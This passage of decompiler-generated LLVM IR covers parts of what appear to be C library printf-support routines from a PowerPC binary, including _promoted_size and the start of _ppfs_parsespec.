  %v3_1000c47c = inttoptr i32 %v2_1000c47c to i32*
  store i32 %v0_1000c47c, i32* %v3_1000c47c, align 4
  br label %dec_label_pc_1000c508

dec_label_pc_1000c484:                            ; preds = %dec_label_pc_1000c41c, %dec_label_pc_1000c420
  store i32 %v1_1000c3ec, i32* %r10.global-to-local, align 4
  %v1_1000c488 = add i32 %v2_1000c4ec, 77
  %v2_1000c488 = inttoptr i32 %v1_1000c488 to i8*
  %v3_1000c488 = load i8, i8* %v2_1000c488, align 1
  %v4_1000c488 = zext i8 %v3_1000c488 to i32
  store i32 %v4_1000c488, i32* %r11.global-to-local, align 4
  %v2_1000c48c = icmp ugt i8 %v3_1000c488, 8
  store i1 %v2_1000c48c, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000c488, 7
  br i1 %tmp25, label %dec_label_pc_1000c4b0, label %dec_label_pc_1000c494

dec_label_pc_1000c494:                            ; preds = %dec_label_pc_1000c484
  %v1_1000c494 = add i32 %v2_1000c4ec, 84
  %v2_1000c494 = inttoptr i32 %v1_1000c494 to i32*
  %v3_1000c494 = load i32, i32* %v2_1000c494, align 4
  %v1_1000c498 = mul nuw nsw i32 %v4_1000c488, 8
  %v1_1000c49c = add nuw nsw i32 %v1_1000c498, 32
  %v2_1000c4a0 = add i32 %v1_1000c49c, %v3_1000c494
  store i32 %v2_1000c4a0, i32* %r9.global-to-local, align 4
  %v1_1000c4a4 = add nuw nsw i32 %v4_1000c488, 1
  store i32 %v1_1000c4a4, i32* %r0.global-to-local, align 4
  %v1_1000c4a8 = trunc i32 %v1_1000c4a4 to i8
  store i8 %v1_1000c4a8, i8* %v2_1000c488, align 1
  br label %dec_label_pc_1000c508

dec_label_pc_1000c4b0:                            ; preds = %dec_label_pc_1000c484
  %v1_1000c4b0 = add i32 %v2_1000c4ec, 80
  %v2_1000c4b0 = inttoptr i32 %v1_1000c4b0 to i32*
  %v3_1000c4b0 = load i32, i32* %v2_1000c4b0, align 4
  %v1_1000c4b4 = add i32 %v3_1000c4b0, 7
  store i32 %v1_1000c4b4, i32* %r9.global-to-local, align 4
  %v1_1000c4b8 = call i32 @__asm_rlwinm(i32 %v1_1000c4b4, i32 0, i32 0, i32 28)
  store i32 %v1_1000c4b8, i32* %r9.global-to-local, align 4
  %v1_1000c4bc = add i32 %v1_1000c4b8, 8
  store i32 %v1_1000c4bc, i32* %r0.global-to-local, align 4
  %v1_1000c4c0 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000c4c0 = add i32 %v1_1000c4c0, 4
  %v3_1000c4c0 = inttoptr i32 %v2_1000c4c0 to i32*
  store i32 %v1_1000c4bc, i32* %v3_1000c4c0, align 4
  br label %dec_label_pc_1000c508

dec_label_pc_1000c4d0:                            ; preds = %dec_label_pc_1000c41c, %dec_label_pc_1000c420, %dec_label_pc_1000c408, %dec_label_pc_1000c3f4
  %v2_1000c4d0 = inttoptr i32 %v1_1000c3ec to i8*
  %v3_1000c4d0 = load i8, i8* %v2_1000c4d0, align 1
  %v4_1000c4d0 = zext i8 %v3_1000c4d0 to i32
  store i32 %v4_1000c4d0, i32* %r11.global-to-local, align 4
  %v2_1000c4d4 = icmp ugt i8 %v3_1000c4d0, 8
  store i1 %v2_1000c4d4, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000c4d0, 7
  br i1 %tmp26, label %dec_label_pc_1000c4f4, label %dec_label_pc_1000c4dc

dec_label_pc_1000c4dc:                            ; preds = %dec_label_pc_1000c4d0
  %v1_1000c4dc = add i32 %v2_1000c4ec, 84
  %v2_1000c4dc = inttoptr i32 %v1_1000c4dc to i32*
  %v3_1000c4dc = load i32, i32* %v2_1000c4dc, align 4
  %v1_1000c4e0 = mul nuw nsw i32 %v4_1000c4d0, 4
  %v2_1000c4e4 = add i32 %v3_1000c4dc, %v1_1000c4e0
  store i32 %v2_1000c4e4, i32* %r9.global-to-local, align 4
  %v1_1000c4e8 = add nuw nsw i32 %v4_1000c4d0, 1
  store i32 %v1_1000c4e8, i32* %r0.global-to-local, align 4
  %v1_1000c4ec = trunc i32 %v1_1000c4e8 to i8
  store i8 %v1_1000c4ec, i8* %v2_1000c4d0, align 1
  br label %dec_label_pc_1000c500

dec_label_pc_1000c4f4:                            ; preds = %dec_label_pc_1000c4d0
  %v1_1000c4f4 = add i32 %v2_1000c4ec, 80
  %v2_1000c4f4 = inttoptr i32 %v1_1000c4f4 to i32*
  %v3_1000c4f4 = load i32, i32* %v2_1000c4f4, align 4
  store i32 %v3_1000c4f4, i32* %r9.global-to-local, align 4
  %v1_1000c4f8 = add i32 %v3_1000c4f4, 4
  store i32 %v1_1000c4f8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c4f8, i32* %v2_1000c4f4, align 4
  br label %dec_label_pc_1000c500

dec_label_pc_1000c500:                            ; preds = %dec_label_pc_1000c4dc, %dec_label_pc_1000c4f4
  %v0_1000c500 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c500 = inttoptr i32 %v0_1000c500 to i32*
  %v2_1000c500 = load i32, i32* %v1_1000c500, align 4
  store i32 %v2_1000c500, i32* %r0.global-to-local, align 4
  %v1_1000c504 = load i32, i32* @r8, align 4
  %v2_1000c504 = inttoptr i32 %v1_1000c504 to i32*
  store i32 %v2_1000c500, i32* %v2_1000c504, align 4
  br label %dec_label_pc_1000c508

dec_label_pc_1000c508:                            ; preds = %dec_label_pc_1000c4b0, %dec_label_pc_1000c494, %dec_label_pc_1000c470, %dec_label_pc_1000c500
  %v0_1000c508 = load i32, i32* @r8, align 4
  %v1_1000c508 = add i32 %v0_1000c508, 8
  store i32 %v1_1000c508, i32* @r8, align 4
  %v0_1000c50c.pre = load i32, i32* @r7, align 4
  %v0_1000c510.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c50c

dec_label_pc_1000c50c:                            ; preds = %dec_label_pc_1000c3d8, %dec_label_pc_1000c508
  %v0_1000c510 = phi i32 [ %v2_1000c4ec, %dec_label_pc_1000c3d8 ], [ %v0_1000c510.pre, %dec_label_pc_1000c508 ]
  %v0_1000c50c = phi i32 [ %v0_1000c3d8, %dec_label_pc_1000c3d8 ], [ %v0_1000c50c.pre, %dec_label_pc_1000c508 ]
  %v1_1000c50c = add i32 %v0_1000c50c, 1
  store i32 %v1_1000c50c, i32* @r7, align 4
  %v1_1000c510 = add i32 %v0_1000c510, 28
  %v2_1000c510 = inttoptr i32 %v1_1000c510 to i32*
  %v3_1000c510 = load i32, i32* %v2_1000c510, align 4
  store i32 %v3_1000c510, i32* %r0.global-to-local, align 4
  %v2_1000c514 = icmp slt i32 %v1_1000c50c, %v3_1000c510
  %v3_1000c514 = icmp sgt i32 %v1_1000c50c, %v3_1000c510
  store i1 %v3_1000c514, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000c514, label %dec_label_pc_1000c3d8, label %dec_label_pc_1000c560

dec_label_pc_1000c520:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000c524 = icmp ne i32 %v3_1000c328, -2147483648
  %v4_1000c524 = icmp eq i32 %v3_1000c328, -2147483648
  store i1 %v3_1000c524, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c524, label %dec_label_pc_1000c52c, label %dec_label_pc_1000c540

dec_label_pc_1000c52c:                            ; preds = %dec_label_pc_1000c520
  %v1_1000c52c = add i32 %v0_1000c320, 36
  %v2_1000c52c = inttoptr i32 %v1_1000c52c to i8*
  %v3_1000c52c = load i8, i8* %v2_1000c52c, align 1
  %v4_1000c52c = zext i8 %v3_1000c52c to i32
  %v1_1000c530 = mul nuw nsw i32 %v4_1000c52c, 8
  %v2_1000c534 = add i32 %v1_1000c530, %v1_1000c324
  store i32 %v2_1000c534, i32* %r9.global-to-local, align 4
  %v1_1000c538 = add i32 %v2_1000c534, -8
  %v2_1000c538 = inttoptr i32 %v1_1000c538 to i32*
  %v3_1000c538 = load i32, i32* %v2_1000c538, align 4
  store i32 %v3_1000c538, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c538, i32* %v2_1000c328, align 4
  %v0_1000c540.pre = load i32, i32* @r3, align 4
  %v1_1000c544.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c540

dec_label_pc_1000c540:                            ; preds = %dec_label_pc_1000c520, %dec_label_pc_1000c52c
  %v1_1000c544 = phi i32 [ -2147483648, %dec_label_pc_1000c520 ], [ %v1_1000c544.pre, %dec_label_pc_1000c52c ]
  %v1_1000c55c = phi i32 [ %v0_1000c320, %dec_label_pc_1000c520 ], [ %v0_1000c540.pre, %dec_label_pc_1000c52c ]
  %v1_1000c540 = add i32 %v1_1000c55c, 4
  %v2_1000c540 = inttoptr i32 %v1_1000c540 to i32*
  %v3_1000c540 = load i32, i32* %v2_1000c540, align 4
  store i32 %v3_1000c540, i32* %r0.global-to-local, align 4
  %v3_1000c544 = icmp sgt i32 %v3_1000c540, %v1_1000c544
  %v4_1000c544 = icmp eq i32 %v3_1000c540, %v1_1000c544
  store i1 %v3_1000c544, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c544, label %dec_label_pc_1000c54c, label %dec_label_pc_1000c560

dec_label_pc_1000c54c:                            ; preds = %dec_label_pc_1000c540
  %v1_1000c54c = add i32 %v1_1000c55c, 37
  %v2_1000c54c = inttoptr i32 %v1_1000c54c to i8*
  %v3_1000c54c = load i8, i8* %v2_1000c54c, align 1
  %v4_1000c54c = zext i8 %v3_1000c54c to i32
  %v1_1000c550 = mul nuw nsw i32 %v4_1000c54c, 8
  %v1_1000c554 = load i32, i32* @r8, align 4
  %v2_1000c554 = add i32 %v1_1000c550, %v1_1000c554
  store i32 %v2_1000c554, i32* %r9.global-to-local, align 4
  %v1_1000c558 = add i32 %v2_1000c554, -8
  %v2_1000c558 = inttoptr i32 %v1_1000c558 to i32*
  %v3_1000c558 = load i32, i32* %v2_1000c558, align 4
  store i32 %v3_1000c558, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c558, i32* %v2_1000c540, align 4
  %v0_1000c560.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c560

dec_label_pc_1000c560:                            ; preds = %dec_label_pc_1000c50c, %dec_label_pc_1000c510.preheader, %dec_label_pc_1000c540, %dec_label_pc_1000c54c
  %v0_1000c560 = phi i32 [ %v1_1000c55c, %dec_label_pc_1000c540 ], [ %v0_1000c560.pre, %dec_label_pc_1000c54c ], [ %v0_1000c5105, %dec_label_pc_1000c510.preheader ], [ %v0_1000c510, %dec_label_pc_1000c50c ]
  %v1_1000c560 = add i32 %v0_1000c560, 8
  %v2_1000c560 = inttoptr i32 %v1_1000c560 to i32*
  %v3_1000c560 = load i32, i32* %v2_1000c560, align 4
  store i32 %v3_1000c560, i32* %r11.global-to-local, align 4
  %v2_1000c564 = icmp sgt i32 %v3_1000c560, 0
  store i1 %v2_1000c564, i1* %cr7_gt.global-to-local, align 1
  %v0_1000c568 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000c560, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000c568)
  %v0_1000c56c = load i32, i32* @r3, align 4
  %v1_1000c56c = add i32 %v0_1000c56c, 16
  %v2_1000c56c = inttoptr i32 %v1_1000c56c to i32*
  %v3_1000c56c = load i32, i32* %v2_1000c56c, align 4
  store i32 %v3_1000c56c, i32* %r0.global-to-local, align 4
  %v0_1000c570 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c570 = sub i32 0, %v0_1000c570
  store i32 %v1_1000c570, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000c578 = add i32 %v0_1000c56c, 8
  %v3_1000c578 = inttoptr i32 %v2_1000c578 to i32*
  store i32 %v1_1000c570, i32* %v3_1000c578, align 4
  %v0_1000c57c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c57c = or i32 %v0_1000c57c, 8
  store i32 %v1_1000c57c, i32* %r0.global-to-local, align 4
  %v0_1000c580 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c580 = load i32, i32* @r3, align 4
  %v2_1000c580 = add i32 %v1_1000c580, 20
  %v3_1000c580 = inttoptr i32 %v2_1000c580 to i32*
  store i32 %v0_1000c580, i32* %v3_1000c580, align 4
  %v1_1000c584 = call i32 @__asm_rlwinm(i32 %v1_1000c57c, i32 0, i32 0, i32 30)
  store i32 %v1_1000c584, i32* %r0.global-to-local, align 4
  %v1_1000c588 = load i32, i32* @r3, align 4
  %v2_1000c588 = add i32 %v1_1000c588, 16
  %v3_1000c588 = inttoptr i32 %v2_1000c588 to i32*
  store i32 %v1_1000c584, i32* %v3_1000c588, align 4
  %v0_1000c58c = load i32, i32* @r3, align 4
  ret i32 %v0_1000c58c

; uselistorder directives
  uselistorder i32 %v3_1000c540, { 1, 0, 2 }
  uselistorder i32 %v1_1000c544, { 1, 0 }
  uselistorder i32 %v3_1000c510, { 1, 0, 2 }
  uselistorder i32 %v1_1000c50c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000c510, { 0, 2, 1 }
  uselistorder i32 %v4_1000c488, { 1, 0, 2 }
  uselistorder i32 %v1_1000c448, { 1, 0 }
  uselistorder i32 %v1_1000c440, { 2, 0, 1 }
  uselistorder i32 %v1_1000c3ec, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000c3e0, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000c3d8, { 1, 0 }
  uselistorder i32 %v2_1000c4ec, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000c5105, { 1, 0, 2 }
  uselistorder i32 %v3_1000c380, { 1, 0, 2 }
  uselistorder i32 %v2_1000c3b0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000c328, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000c320, { 1, 0, 2 }
  uselistorder i32 %v0_1000c320, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 19, 18, 7, 8, 9, 10, 17, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_1000c560, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c540, { 1, 0 }
  uselistorder label %dec_label_pc_1000c50c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c508, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c500, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4d0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c484, { 1, 0 }
  uselistorder label %dec_label_pc_1000c470, { 1, 0 }
  uselistorder label %dec_label_pc_1000c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c510.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c3c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c380, { 1, 0 }
  uselistorder label %dec_label_pc_1000c374, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000c59c

dec_label_pc_1000c59c:                            ; preds = %dec_label_pc_1000c59c, %entry
  %v0_1000c59c = phi i32 [ ptrtoint (i32* @global_var_1001c91c.847 to i32), %entry ], [ %v1_1000c59c, %dec_label_pc_1000c59c ]
  %v1_1000c59c = add i32 %v0_1000c59c, -2
  %v2_1000c59c = inttoptr i32 %v1_1000c59c to i16*
  %v3_1000c59c = load i16, i16* %v2_1000c59c, align 2
  %v4_1000c59c = sext i16 %v3_1000c59c to i32
  %v4_1000c5a0 = icmp eq i32 %v4_1000c59c, %arg1
  %v3_1000c5a4.not = icmp ule i32 %v1_1000c59c, ptrtoint (i32* @global_var_1001c904.848 to i32)
  %brmerge = or i1 %v4_1000c5a0, %v3_1000c5a4.not
  br i1 %brmerge, label %dec_label_pc_1000c5b0, label %dec_label_pc_1000c59c

dec_label_pc_1000c5b0:                            ; preds = %dec_label_pc_1000c59c
  %v2_1000c5b8 = sub i32 %v1_1000c59c, ptrtoint (i32* @global_var_1001c904.848 to i32)
  %v1_1000c5c0 = udiv i32 %v2_1000c5b8, 2
  %v2_1000c5c0 = and i32 %v2_1000c5b8, -2147483648
  %v3_1000c5c0 = or i32 %v1_1000c5c0, %v2_1000c5c0
  %v2_1000c5c8 = add i32 %v3_1000c5c0, ptrtoint (i32* @global_var_1001c91c.847 to i32)
  %v3_1000c5c8 = inttoptr i32 %v2_1000c5c8 to i8*
  %v4_1000c5c8 = load i8, i8* %v3_1000c5c8, align 1
  %v5_1000c5c8 = zext i8 %v4_1000c5c8 to i32
  ret i32 %v5_1000c5c8

; uselistorder directives
  uselistorder i32 %v2_1000c5b8, { 1, 0 }
  uselistorder i32 %v1_1000c59c, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1001c904.848 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001c91c.847 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000c5d0 = load i32, i32* @lr, align 4
  store i32 %v0_1000c5d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000c5e8 = add i32 %tmp, 16
  %v2_1000c5e8 = inttoptr i32 %v1_1000c5e8 to i32*
  %v3_1000c5e8 = load i32, i32* %v2_1000c5e8, align 4
  %v1_1000c5f0 = and i32 %v3_1000c5e8, 128
  store i32 %v1_1000c5f0, i32* %r6.global-to-local, align 4
  %v3_1000c5f0 = icmp eq i32 %v1_1000c5f0, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000c604 = add i32 %tmp, 24
  %v2_1000c604 = inttoptr i32 %v1_1000c604 to i32*
  %v3_1000c604 = load i32, i32* %v2_1000c604, align 4
  store i32 %v3_1000c604, i32* @r26, align 4
  br i1 %v3_1000c5f0, label %dec_label_pc_1000c60c, label %dec_label_pc_1000c624

dec_label_pc_1000c60c:                            ; preds = %entry
  %v2_1000c60c = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000c678

dec_label_pc_1000c61c:                            ; preds = %dec_label_pc_1000c84c
  %v1_1000c61c = add i32 %v0_1000c81c, 1
  store i32 %v1_1000c61c, i32* @r30, align 4
  br label %dec_label_pc_1000c864

dec_label_pc_1000c624:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000c628 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c628, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000c634 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c634, i32* @r7, align 4
  br label %dec_label_pc_1000c638

dec_label_pc_1000c638:                            ; preds = %dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge, %dec_label_pc_1000c624
  %v0_1000c640 = phi i32 [ %v0_1000c640.pre, %dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge ], [ %v2_1000c628, %dec_label_pc_1000c624 ]
  %v0_1000c63c = phi i32 [ %v0_1000c63c.pre, %dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge ], [ %v2_1000c634, %dec_label_pc_1000c624 ]
  %v0_1000c644 = phi i32 [ %v0_1000c638.pre, %dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge ], [ 0, %dec_label_pc_1000c624 ]
  %v1_1000c638 = mul i32 %v0_1000c644, 4
  %v2_1000c63c = add i32 %v0_1000c644, %v0_1000c63c
  store i32 %v2_1000c63c, i32* %r9.global-to-local, align 4
  %v2_1000c640 = add i32 %v1_1000c638, %v0_1000c640
  store i32 %v2_1000c640, i32* %r11.global-to-local, align 4
  %v1_1000c644 = add i32 %v0_1000c644, 1
  store i32 %v1_1000c644, i32* %r10.global-to-local, align 4
  %v1_1000c648 = add i32 %v2_1000c640, -4
  %v2_1000c648 = inttoptr i32 %v1_1000c648 to i32*
  %v3_1000c648 = load i32, i32* %v2_1000c648, align 4
  store i32 %v3_1000c648, i32* %r0.global-to-local, align 4
  %v1_1000c64c = trunc i32 %v3_1000c648 to i8
  %v3_1000c64c = add i32 %v2_1000c63c, 24
  %v4_1000c64c = inttoptr i32 %v3_1000c64c to i8*
  store i8 %v1_1000c64c, i8* %v4_1000c64c, align 1
  %v0_1000c650 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c650 = urem i32 %v0_1000c650, 256
  store i32 %v1_1000c650, i32* %r0.global-to-local, align 4
  %v0_1000c658 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c658 = add i32 %v0_1000c658, -4
  %v2_1000c658 = inttoptr i32 %v1_1000c658 to i32*
  %v3_1000c658 = load i32, i32* %v2_1000c658, align 4
  store i32 %v3_1000c658, i32* %r9.global-to-local, align 4
  %v4_1000c65c = icmp eq i32 %v1_1000c650, %v3_1000c658
  br i1 %v4_1000c65c, label %dec_label_pc_1000c664, label %dec_label_pc_1000cad4

dec_label_pc_1000c664:                            ; preds = %dec_label_pc_1000c638
  %v3_1000c654 = icmp eq i32 %v1_1000c650, 0
  br i1 %v3_1000c654, label %dec_label_pc_1000c66c, label %dec_label_pc_1000c668

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c664
  %v0_1000c668 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c668 = add i32 %v0_1000c668, -1
  store i32 %v1_1000c668, i32* %ctr.global-to-local, align 4
  %v2_1000c668 = icmp eq i32 %v1_1000c668, 0
  br i1 %v2_1000c668, label %dec_label_pc_1000c66c, label %dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge

dec_label_pc_1000c668.dec_label_pc_1000c638_crit_edge: ; preds = %dec_label_pc_1000c668
  %v0_1000c638.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000c63c.pre = load i32, i32* @r7, align 4
  %v0_1000c640.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000c638

dec_label_pc_1000c66c:                            ; preds = %dec_label_pc_1000c668, %dec_label_pc_1000c664
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c670 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000c678

dec_label_pc_1000c678:                            ; preds = %dec_label_pc_1000c60c, %dec_label_pc_1000c66c
  %v2_1000c688.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000c60c ], [ %v2_1000c634, %dec_label_pc_1000c66c ]
  %storemerge3 = phi i32 [ %v2_1000c60c, %dec_label_pc_1000c60c ], [ %v2_1000c670, %dec_label_pc_1000c66c ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 %v2_1000c688.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000c698

dec_label_pc_1000c694:                            ; preds = %dec_label_pc_1000c7a4, %dec_label_pc_1000c828
  %v0_1000c694 = phi i32 [ %v1_1000c828, %dec_label_pc_1000c828 ], [ %v0_1000c78c, %dec_label_pc_1000c7a4 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000c828 ], [ %stack_var_-84.2, %dec_label_pc_1000c7a4 ]
  store i32 %v0_1000c694, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000c698

dec_label_pc_1000c698:                            ; preds = %dec_label_pc_1000c678, %dec_label_pc_1000c694
  %v0_1000c6ac = phi i32 [ %storemerge3, %dec_label_pc_1000c678 ], [ %v0_1000c694, %dec_label_pc_1000c694 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000c678 ], [ %stack_var_-84.0, %dec_label_pc_1000c694 ]
  %v1_1000c698 = inttoptr i32 %v0_1000c6ac to i8*
  %v2_1000c698 = load i8, i8* %v1_1000c698, align 1
  %v3_1000c698 = zext i8 %v2_1000c698 to i32
  store i32 %v3_1000c698, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c6ac, i32* @r30, align 4
  %v3_1000c6a0 = icmp eq i8 %v2_1000c698, 42
  br i1 %v3_1000c6a0, label %dec_label_pc_1000c6a8, label %dec_label_pc_1000c6b8

dec_label_pc_1000c6a8:                            ; preds = %dec_label_pc_1000c698
  %v0_1000c6a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c6a8 = mul i32 %v0_1000c6a8, -4
  store i32 %v1_1000c6a8, i32* %r0.global-to-local, align 4
  %v1_1000c6ac = add i32 %v0_1000c6ac, 1
  store i32 %v1_1000c6ac, i32* @r30, align 4
  %v0_1000c6b0 = load i32, i32* @r1, align 4
  %v2_1000c6b0 = add i32 %v0_1000c6b0, %v1_1000c6a8
  store i32 %v2_1000c6b0, i32* %r9.global-to-local, align 4
  %v0_1000c6b4 = load i32, i32* @r29, align 4
  %v2_1000c6b4 = add i32 %v2_1000c6b0, 8
  %v3_1000c6b4 = inttoptr i32 %v2_1000c6b4 to i32*
  store i32 %v0_1000c6b4, i32* %v3_1000c6b4, align 4
  %v0_1000c6d0.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c6b8

dec_label_pc_1000c6b8:                            ; preds = %dec_label_pc_1000c698, %dec_label_pc_1000c6a8
  %v0_1000c6d0.pre = phi i32 [ %v0_1000c6ac, %dec_label_pc_1000c698 ], [ %v0_1000c6d0.pre.pre, %dec_label_pc_1000c6a8 ]
  %v3_1000c6b8 = load i32, i32* @global_var_1002e5b0, align 4
  store i32 %v3_1000c6b8, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000c6d0

dec_label_pc_1000c6c4:                            ; preds = %dec_label_pc_1000c6d0
  %v2_1000c6d4 = icmp sgt i32 %v0_1000c71c, 4094
  br i1 %v2_1000c6d4, label %dec_label_pc_1000c6cc, label %dec_label_pc_1000c6c8

dec_label_pc_1000c6c8:                            ; preds = %dec_label_pc_1000c6c4
  %v1_1000c6c8 = add i32 %v2_1000c6e8, -48
  store i32 %v1_1000c6c8, i32* @r8, align 4
  br label %dec_label_pc_1000c6cc

dec_label_pc_1000c6cc:                            ; preds = %dec_label_pc_1000c6c4, %dec_label_pc_1000c6c8
  %v0_1000c6d415 = phi i32 [ %v0_1000c71c, %dec_label_pc_1000c6c4 ], [ %v1_1000c6c8, %dec_label_pc_1000c6c8 ]
  %v1_1000c6cc = add i32 %v0_1000c74c, 1
  store i32 %v1_1000c6cc, i32* @r30, align 4
  br label %dec_label_pc_1000c6d0

dec_label_pc_1000c6d0:                            ; preds = %dec_label_pc_1000c6b8, %dec_label_pc_1000c6cc
  %v0_1000c71c = phi i32 [ 0, %dec_label_pc_1000c6b8 ], [ %v0_1000c6d415, %dec_label_pc_1000c6cc ]
  %v0_1000c74c = phi i32 [ %v0_1000c6d0.pre, %dec_label_pc_1000c6b8 ], [ %v1_1000c6cc, %dec_label_pc_1000c6cc ]
  %v1_1000c6d0 = inttoptr i32 %v0_1000c74c to i8*
  %v2_1000c6d0 = load i8, i8* %v1_1000c6d0, align 1
  %v3_1000c6d0 = zext i8 %v2_1000c6d0 to i32
  store i32 %v3_1000c6d0, i32* %r11.global-to-local, align 4
  %v1_1000c6d8 = mul nuw nsw i32 %v3_1000c6d0, 2
  store i32 %v1_1000c6d8, i32* %r9.global-to-local, align 4
  %v2_1000c6dc = add i32 %v1_1000c6d8, %v3_1000c6b8
  %v3_1000c6dc = inttoptr i32 %v2_1000c6dc to i16*
  %v4_1000c6dc = load i16, i16* %v3_1000c6dc, align 2
  %v5_1000c6dc = zext i16 %v4_1000c6dc to i32
  store i32 %v5_1000c6dc, i32* %r0.global-to-local, align 4
  %v1_1000c6e0 = mul i32 %v0_1000c71c, 10
  %v1_1000c6e4 = and i32 %v5_1000c6dc, 8
  store i32 %v1_1000c6e4, i32* @r25, align 4
  %v3_1000c6e4 = icmp eq i32 %v1_1000c6e4, 0
  %v2_1000c6e8 = add i32 %v3_1000c6d0, %v1_1000c6e0
